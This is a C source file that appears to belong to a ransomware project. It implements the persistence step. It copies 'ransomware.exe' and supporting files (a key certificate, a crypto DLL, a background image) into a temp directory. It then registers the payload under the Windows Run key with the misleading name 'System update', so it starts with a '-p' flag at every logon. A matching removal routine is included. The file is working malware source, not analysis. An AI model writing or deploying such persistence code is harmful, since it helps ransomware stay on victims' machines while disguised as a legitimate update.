#include <Windows.h>
#include <stdio.h>
#include <time.h>
const char* tabFileToCopy[] = {
	"PutKey.crt",
	"libcrypto-1_1-x64.dll",
	"vcruntime140.dll",
	"background.bmp",
	"dmp-40423.exe"
};


BOOL Persistence(char* tempPath) {
	HKEY hKey;
	char* newPath = (char*)calloc(MAX_PATH + 1, 1);
	if (newPath != NULL) {

		CreateDirectoryA(tempPath, NULL); // check if Fail 
		for (int i = 0; i < (sizeof(tabFileToCopy) - 1) / sizeof(char*); i++) {
			sprintf_s(newPath, MAX_PATH, "%s%s", tempPath, tabFileToCopy[i]);
			CopyFileA(tabFileToCopy[i], newPath, FALSE);
		}
		sprintf_s(newPath, MAX_PATH, "%s%s", tempPath, tabFileToCopy[4]);

		if (CopyFileA("ransomware.exe", newPath, FALSE)) {
			if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
				strcat_s(newPath, MAX_PATH, " -p");
				RegSetValueExA(hKey, "System update", 0, REG_SZ, (LPBYTE)newPath, (DWORD)strlen(newPath) + 1);
				RegCloseKey(hKey);
				free(newPath);
				return TRUE;
			}
		}
		free(newPath);
	}
	return FALSE;
}


BOOL RemovePersistence(char* tempPath) {
	HKEY hKey;
	char* newPath = (char*)calloc(MAX_PATH + 1, 1);
	if (newPath != NULL) {
		for (int i = 0; i < (sizeof(tabFileToCopy)) / sizeof(char*); i++) {
			sprintf_s(newPath, MAX_PATH, "%s%s", tempPath, tabFileToCopy[i]);
			printf("Remove: %s\n", newPath);
			remove(newPath);
		}
		if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
			LONG  lResult = RegDeleteValueA(hKey, "System update");
			RegCloseKey(hKey);
			free(newPath);
			return lResult == ERROR_SUCCESS;
		}
		free(newPath);
	}
	return FALSE;
}